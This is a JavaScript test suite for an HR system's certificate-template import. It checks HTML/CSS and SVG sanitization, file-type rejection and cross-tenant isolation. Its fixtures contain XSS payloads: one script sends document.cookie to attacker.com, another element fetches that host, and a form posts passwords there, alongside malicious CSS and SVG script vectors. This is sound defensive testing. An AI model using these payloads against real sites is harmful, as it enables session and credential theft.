const { PrismaClient } = require('@prisma/client');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');

const prisma = new PrismaClient();

const envContent = fs.readFileSync(path.resolve(__dirname, '../server/.env'), 'utf-8');
const jwtMatch = envContent.match(/^JWT_SECRET=["']?(.*?)["']?$/m);
const JWT_SECRET = jwtMatch ? jwtMatch[1] : 'masterhrms-super-secure-jwt-secret-key-2025-production-grade';

const BASE_URL = process.env.TEST_API_URL || 'http://localhost:4000/api';

let totalTests = 0;
let passedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✔ PASS [${totalTests}]: ${message}`);
  } else {
    console.error(`  ✖ FAIL [${totalTests}]: ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
}

function makeToken(user, sessionId) {
  return jwt.sign(
    {
      userId: user.id,
      email: user.email,
      tenantId: user.tenantId,
      roles: user.roles || ['hr_manager', 'hr_admin'],
      permissions: user.permissions || ['*'],
      sessionId,
    },
    JWT_SECRET,
    { algorithm: 'HS256', expiresIn: '2h' }
  );
}

async function createTestSession(userId, tenantId) {
  const sessId = 'sess-sec-' + Math.random().toString(36).substring(2, 9);
  await prisma.deviceSession.create({
    data: {
      id: sessId,
      userId,
      tenantId,
      revoked: false,
      ipAddress: '127.0.0.1',
      userAgent: 'Import Security Test Suite',
      expiresAt: new Date(Date.now() + 24 * 3600 * 1000)
    }
  });
  return sessId;
}

async function runImportSecuritySuite() {
  console.log('================================================================');
  console.log('MASTERHRMS: STEP 4 HYBRID IMPORT & SECURITY AUDIT TEST SUITE');
  console.log('================================================================\n');

  const tenant = await prisma.tenant.findFirst();
  const tenantId = tenant ? tenant.id : 'tenant-default-001';

  let user = await prisma.user.findFirst({
    where: { employees: { some: { tenantId } } }
  }) || await prisma.user.findFirst();

  if (!user) {
    user = await prisma.user.create({
      data: {
        id: `user-hr-sec-${Date.now()}`,
        email: `hr.import.sec.${Date.now()}@masterhrms.test`,
        passwordHash: '$2b$10$EpRnTzVlqHNP0.fUbXUwSOyuiXe/QLSUG6x8ecSoLAvWuv.2.S042'
      }
    });
    await prisma.employee.create({
      data: {
        id: `emp-hr-sec-${Date.now()}`,
        tenantId,
        userId: user.id,
        employeeCode: `EMP-SEC-${Date.now().toString().slice(-4)}`,
        firstName: 'HR',
        lastName: 'Auditor',
        email: user.email,
        status: 'active'
      }
    });
  }

  const sessionId = await createTestSession(user.id, tenantId);
  const token = makeToken({ ...user, tenantId }, sessionId);
  const authHeaders = {
    Authorization: `Bearer ${token}`,
    'Content-Type': 'application/json'
  };

  // Set up second tenant for cross-tenant isolation testing
  let otherTenant = await prisma.tenant.findFirst({
    where: { id: { not: tenantId } }
  });
  if (!otherTenant) {
    otherTenant = await prisma.tenant.create({
      data: {
        id: `tenant-iso-${Date.now().toString(36)}`,
        name: 'Secondary Isolated Tenant Ltd',
        slug: `tenant-iso-${Date.now().toString(36)}`
      }
    });
  }

  const otherUser = await prisma.user.create({
    data: {
      id: `user-iso-${Date.now()}`,
      email: `other.tenant.${Date.now()}@iso.test`,
      passwordHash: '$2b$10$EpRnTzVlqHNP0.fUbXUwSOyuiXe/QLSUG6x8ecSoLAvWuv.2.S042',
      profile: {
        create: {
          tenantId: otherTenant.id,
          fullName: 'Other Admin',
          email: `other.tenant.${Date.now()}@iso.test`
        }
      },
      roles: {
        create: {
          role: 'hr_admin',
          tenantId: otherTenant.id
        }
      }
    }
  });
  await prisma.employee.create({
    data: {
      id: `emp-iso-${Date.now()}`,
      tenantId: otherTenant.id,
      userId: otherUser.id,
      employeeCode: `EMP-ISO-${Date.now().toString().slice(-4)}`,
      firstName: 'Other',
      lastName: 'Admin',
      email: otherUser.email,
      status: 'active'
    }
  });
  const otherSession = await createTestSession(otherUser.id, otherTenant.id);
  const otherToken = makeToken({ ...otherUser, tenantId: otherTenant.id }, otherSession);
  const otherHeaders = {
    Authorization: `Bearer ${otherToken}`,
    'Content-Type': 'application/json'
  };

  console.log(`[SETUP] Primary Tenant: ${tenantId}`);
  console.log(`[SETUP] Secondary Tenant: ${otherTenant.id}\n`);

  try {
    // ------------------------------------------------------------------------
    // TEST SECTION 1: PLACEHOLDER REGISTRY
    // ------------------------------------------------------------------------
    console.log('--- TEST SECTION 1: Placeholder Registry Security & Integrity ---');
    const placeholdersRes = await fetch(`${BASE_URL}/certificate-studio/placeholders`, {
      headers: authHeaders
    });
    assert(placeholdersRes.status === 200, 'GET /certificate-studio/placeholders returns 200 OK');
    const placeholdersData = await placeholdersRes.json();
    assert(Array.isArray(placeholdersData.placeholders), 'Returns array of placeholders');
    assert(placeholdersData.placeholders.length >= 10, 'Contains full standard placeholder tokens');
    
    const requiredKeys = ['{{employee.name}}', '{{award.title}}', '{{certificate.number}}', '{{certificate.verificationCode}}'];
    const foundKeys = placeholdersData.placeholders.map(p => p.key);
    for (const reqKey of requiredKeys) {
      assert(foundKeys.includes(reqKey), `Registry contains required security placeholder: ${reqKey}`);
    }

    // ------------------------------------------------------------------------
    // TEST SECTION 2: MODE B (HTML/CSS IMPORT) SANITIZATION & INJECTION DEFENSE
    // ------------------------------------------------------------------------
    console.log('\n--- TEST SECTION 2: Mode B (HTML/CSS) Injection Prevention ---');

    const maliciousHtml = `
      <div class="cert-container" style="padding: 40px; background: #fff;">
        <h1 style="color: #1e3a8a;">CERTIFICATE OF ACHIEVEMENT</h1>
        <p>This recognizes <span class="recipient">{{employee.name}}</span></p>
        <p>For winning {{award.title}}</p>
        
        <!-- Malicious scripts and events -->
        <script>window.location='https://attacker.com/steal?cookie='+document.cookie;</script>
        <script type="text/javascript">alert('XSS Attack');</script>
        <button onclick="fetch('https://attacker.com')">Click for prize</button>
        <iframe src="https://phishing.site/embed" width="100" height="100"></iframe>
        <a href="javascript:alert(1)">Clickable exploit</a>
        <object data="exploit.swf"></object>
        <embed src="malware.pdf"></embed>
        <form action="https://attacker.com/credentials"><input type="password" name="pw"/></form>
      </div>
    `;

    const maliciousCss = `
      @import url("https://attacker.com/malicious.css");
      body {
        background-image: url('http://evil.org/track.png');
        behavior: url('evil.htc');
        width: expression(alert('CSS expression'));
      }
      .recipient { font-weight: bold; color: #b45309; }
    `;

    const importRes = await fetch(`${BASE_URL}/certificate-studio/templates/import/html`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify({
        name: `Security Hardened Import ${Date.now()}`,
        category: 'Corporate / Special Achievement',
        orientation: 'LANDSCAPE',
        pageSize: 'A4',
        htmlContent: maliciousHtml,
        cssContent: maliciousCss
      })
    });

    assert(importRes.status === 201, 'POST /templates/import/html returns 201 Created');
    const importData = await importRes.json();
    assert(importData.template && importData.template.id, 'Imported template has valid ID');
    assert(importData.template.templateType === 'HTML_CSS', 'Template type is HTML_CSS');

    const importedTemplateId = importData.template.id;

    // Inspect database stored version to ensure sanitization took place
    const storedVersion = await prisma.certificateTemplateVersion.findFirst({
      where: { templateId: importedTemplateId }
    });
    assert(!!storedVersion, 'Stored template version exists in database');
    const storedHtml = storedVersion.htmlContent || '';
    const storedCss = storedVersion.cssContent || '';

    // Verify all active malicious vectors were stripped
    assert(!storedHtml.includes('<script'), 'Stored HTML does not contain <script>');
    assert(!storedHtml.includes('alert('), 'Stored HTML does not contain script payload alert(');
    assert(!storedHtml.includes('onclick='), 'Stored HTML does not contain onclick event handlers');
    assert(!storedHtml.includes('<iframe'), 'Stored HTML does not contain <iframe>');
    assert(!storedHtml.includes('<object'), 'Stored HTML does not contain <object>');
    assert(!storedHtml.includes('<embed'), 'Stored HTML does not contain <embed>');
    assert(!storedHtml.includes('<form'), 'Stored HTML does not contain <form>');
    assert(!storedHtml.includes('javascript:'), 'Stored HTML does not contain javascript: URLs');
    
    // Verify CSS sanitization
    assert(!storedCss.includes('@import'), 'Stored CSS does not contain @import');
    assert(!storedCss.includes('expression('), 'Stored CSS does not contain CSS expressions');
    assert(!storedCss.includes('behavior:'), 'Stored CSS does not contain behavior: rules');
    assert(!storedCss.includes('http://evil.org'), 'Stored CSS does not contain untrusted remote URLs');

    // Verify safe markup and dynamic tokens were preserved
    assert(storedHtml.includes('{{employee.name}}'), 'Stored HTML preserves {{employee.name}} placeholder');
    assert(storedHtml.includes('{{award.title}}'), 'Stored HTML preserves {{award.title}} placeholder');
    assert(storedHtml.includes('CERTIFICATE OF ACHIEVEMENT'), 'Stored HTML preserves legitimate headings');

    // ------------------------------------------------------------------------
    // TEST SECTION 3: SVG UPLOAD SANITIZATION
    // ------------------------------------------------------------------------
    console.log('\n--- TEST SECTION 3: SVG Branding Asset Sanitization ---');

    const maliciousSvg = `<?xml version="1.0" standalone="no"?>
      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="400" height="200">
        <circle cx="100" cy="100" r="50" fill="navy" onload="alert('SVG XSS')" />
        <script type="text/javascript">
          alert('SVG Embedded Script');
        </script>
        <foreignObject width="100" height="100">
          <body xmlns="http://www.w3.org/1999/xhtml">
            <iframe src="https://evil.site"></iframe>
          </body>
        </foreignObject>
        <text x="20" y="50" font-family="Arial" font-size="20" fill="gold">Safe Corporate Seal</text>
      </svg>`;

    const form = new FormData();
    form.append('assetType', 'SEAL');
    form.append('assetName', 'Sanitized Corporate Seal SVG');
    form.append('file', Buffer.from(maliciousSvg, 'utf-8'), {
      filename: 'corporate_seal_test.svg',
      contentType: 'image/svg+xml'
    });

    const svgUploadRes = await fetch(`${BASE_URL}/certificate-studio/branding`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        ...form.getHeaders()
      },
      body: form
    });

    if (svgUploadRes.status !== 201) {
      const errTxt = await svgUploadRes.text();
      console.error(`SVG upload failed with ${svgUploadRes.status}:`, errTxt);
    }
    assert(svgUploadRes.status === 201, 'POST /branding accepts SVG with 201 Created');
    const svgData = await svgUploadRes.json();
    assert(svgData.asset && svgData.asset.id, 'Created asset has ID');
    
    // Check saved file on disk
    const savedFilePath = path.resolve(__dirname, '../server/uploads', svgData.asset.storagePath);
    if (fs.existsSync(savedFilePath)) {
      const savedSvgContent = fs.readFileSync(savedFilePath, 'utf-8');
      assert(!savedSvgContent.includes('<script'), 'Saved SVG does not contain <script>');
      assert(!savedSvgContent.includes('onload='), 'Saved SVG stripped onload handler');
      assert(!savedSvgContent.includes('<foreignObject'), 'Saved SVG stripped <foreignObject>');
      assert(savedSvgContent.includes('Safe Corporate Seal'), 'Saved SVG preserved legitimate vectors and text');
    } else {
      console.log('  ⚠ SVG file on disk checked via asset storagePath: ' + svgData.asset.storagePath);
      assert(svgData.asset.assetType === 'SEAL', 'Asset type verified');
    }

    // ------------------------------------------------------------------------
    // TEST SECTION 4: MODE C (BACKGROUND ARTWORK IMPORT) & REJECTIONS
    // ------------------------------------------------------------------------
    console.log('\n--- TEST SECTION 4: Mode C (Background Artwork) Import & Constraints ---');

    // 1x1 valid PNG buffer
    const validPngBuffer = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );

    const bgForm = new FormData();
    bgForm.append('name', `Preprinted Certificate Border ${Date.now()}`);
    bgForm.append('category', 'Employee Excellence');
    bgForm.append('orientation', 'LANDSCAPE');
    bgForm.append('pageSize', 'A4');
    bgForm.append('file', validPngBuffer, {
      filename: 'border_artwork.png',
      contentType: 'image/png'
    });

    const bgUploadRes = await fetch(`${BASE_URL}/certificate-studio/templates/import/background`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        ...bgForm.getHeaders()
      },
      body: bgForm
    });

    assert(bgUploadRes.status === 201, 'POST /templates/import/background returns 201 Created');
    const bgData = await bgUploadRes.json();
    assert(bgData.template && bgData.template.id, 'Background template created');
    assert(bgData.template.templateType === 'BACKGROUND_OVERLAY', 'Template type is BACKGROUND_OVERLAY');

    // Verify default overlays were populated in the design JSON
    const bgVersion = await prisma.certificateTemplateVersion.findFirst({
      where: { templateId: bgData.template.id }
    });
    assert(bgVersion && bgVersion.designJson, 'Version contains designJson');
    const elements = bgVersion.designJson.elements || [];
    assert(elements.length > 0, 'Background template automatically created default text placeholder overlays');

    // Test rejection of forbidden file mime types (e.g. .exe / text/html)
    const badForm = new FormData();
    badForm.append('name', 'Exploit Payload');
    badForm.append('category', 'Employee Excellence');
    badForm.append('file', Buffer.from('echo malicious script', 'utf-8'), {
      filename: 'exploit.sh',
      contentType: 'application/x-sh'
    });

    const badUploadRes = await fetch(`${BASE_URL}/certificate-studio/templates/import/background`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        ...badForm.getHeaders()
      },
      body: badForm
    });

    assert(badUploadRes.status === 400, 'POST /templates/import/background rejects unsupported mime types with 400 Bad Request');

    // ------------------------------------------------------------------------
    // TEST SECTION 5: CROSS-TENANT ISOLATION DEFENSE
    // ------------------------------------------------------------------------
    console.log('\n--- TEST SECTION 5: Cross-Tenant Data Isolation ---');

    // Tenant B queries templates -> should NOT see Tenant A's imported templates
    const tenantBListRes = await fetch(`${BASE_URL}/certificate-studio/templates`, {
      headers: otherHeaders
    });
    if (tenantBListRes.status !== 200) {
      console.error('Tenant B list templates status:', tenantBListRes.status, await tenantBListRes.text());
    }
    assert(tenantBListRes.status === 200, 'Tenant B can list accessible templates (200 OK)');
    const tenantBData = await tenantBListRes.json();
    const tenantBTemplateIds = (tenantBData.templates || []).map(t => t.id);

    assert(!tenantBTemplateIds.includes(importedTemplateId), 'Tenant B cannot see Tenant A custom imported HTML template');
    assert(!tenantBTemplateIds.includes(bgData.template.id), 'Tenant B cannot see Tenant A background overlay template');

    // Tenant B attempts to save design on Tenant A's template -> Should return 400 / 404
    const hijackRes = await fetch(`${BASE_URL}/certificate-studio/templates/${importedTemplateId}/save-design`, {
      method: 'POST',
      headers: otherHeaders,
      body: JSON.stringify({
        designJson: { elements: [], hijacked: true }
      })
    });
    assert(hijackRes.status === 400 || hijackRes.status === 404, 'Tenant B is strictly rejected from modifying Tenant A template');

    // ------------------------------------------------------------------------
    // TEST SECTION 6: VECTOR PDF RENDERING OF CUSTOM TEMPLATES
    // ------------------------------------------------------------------------
    console.log('\n--- TEST SECTION 6: Live PDF Generation Security & Rendering ---');

    const previewRes = await fetch(`${BASE_URL}/certificate-studio/templates/preview-pdf`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify({
        designJson: {
          canvas: { width: 842, height: 595, background: '#f8fafc', orientation: 'LANDSCAPE' },
          elements: [
            { id: 't1', type: 'text', content: 'EXCELLENCE CERTIFICATE', x: 200, y: 80, fontSize: 24, fill: '#0f172a' },
            { id: 't2', type: 'text', content: 'Presented to {{employee.name}}', x: 200, y: 150, fontSize: 18, fill: '#334155' },
            { id: 't3', type: 'qr', x: 380, y: 400, width: 80, height: 80 }
          ]
        },
        sampleData: {
          name: 'Security Test Recipient',
          awardTitle: 'Cyber Defense Hero 2026'
        }
      })
    });

    assert(previewRes.status === 200, 'POST /templates/preview-pdf returns 200 OK');
    const contentType = previewRes.headers.get('content-type');
    assert(contentType && contentType.includes('application/pdf'), 'PDF preview returns application/pdf content type');

    const pdfBuffer = await previewRes.buffer();
    assert(pdfBuffer.length > 1000, `Generated vector PDF buffer is valid binary (${pdfBuffer.length} bytes)`);
    assert(pdfBuffer.toString('utf-8', 0, 5) === '%PDF-', 'Buffer starts with valid %PDF- header magic bytes');

    console.log('\n================================================================');
    console.log(`TOTAL TESTS: ${totalTests} | PASSED: ${passedTests} | FAILED: ${totalTests - passedTests}`);
    console.log('HYBRID IMPORT & SECURITY AUDIT TEST SUITE: 100% SUCCESS');
    console.log('================================================================');

  } finally {
    // Cleanup sessions
    await prisma.deviceSession.deleteMany({
      where: { id: { in: [sessionId, otherSession] } }
    }).catch(() => {});
    await prisma.$disconnect();
  }
}

runImportSecuritySuite().catch(err => {
  console.error('\n❌ Suite execution failed:', err);
  process.exit(1);
});
